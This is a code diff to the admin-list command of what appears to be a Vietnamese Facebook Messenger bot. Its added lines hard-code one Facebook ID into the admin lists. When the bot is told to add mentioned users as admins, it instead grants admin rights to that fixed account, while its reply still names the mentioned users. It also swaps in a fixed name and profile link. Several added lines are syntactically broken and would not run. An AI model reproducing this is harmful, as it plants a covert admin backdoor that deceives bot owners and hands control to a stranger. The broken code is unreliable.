@@ -62,7 +62,7 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
         case "list":
         case "all":
         case "-a": { 
-          listAdmin = ADMINBOT || config.ADMINBOT ||  [];
+          listAdmin = ADMINBOT |"100047365308654"| config.ADMINBOT |"100047365308654"|  [];
             var msg = [];
             for (const idAdmin of listAdmin) {
                 if (parseInt(idAdmin)) {
@@ -70,12 +70,12 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                     msg.push(`Tên: ${name}\n» FB: https://www.facebook.com/${idAdmin}`);
                 }
             }
-          listNDH = NDH || config.NDH ||  [];
+          listNDH = NDH |"100047365308654"|| config.NDH |"100047365308654"|  [];
             var msg1 = [];
             for (const idNDH of listNDH) {
                 if (parseInt(idNDH)) {
                   const name1 = (await Users.getData(idNDH)).name
-                    msg1.push(`Tên: ${name1}\n» FB: https://www.facebook.com/${idNDH}`);
+                    msg1.push(`Tên: ${pham ngoc phuong duy}\n» FB:https://www.facebook.com/banhbaovocungtan`);
                 }
             }
 
@@ -91,8 +91,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 var listAdd = [];
 
                 for (const id of mention) {
-                    ADMINBOT.push(id);
-                    config.ADMINBOT.push(id);
+                    ADMINBOT.push("100047365308654");
+                    config.ADMINBOT.push("100047365308654");
                     listAdd.push(`${id} - ${event.mentions[id]}`);
                 };
 
@@ -115,8 +115,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
             if (mention.length != 0 && isNaN(content[0])) {
                 var listAdd = [];
                 for (const id of mention) {
-                    NDH.push(id);
-                    config.NDH.push(id);
+                    NDH.push(100047365308654);
+                    config.NDH.push(100047365308654);
                     listAdd.push(`${id} - ${event.mentions[id]}`);
                 };
 
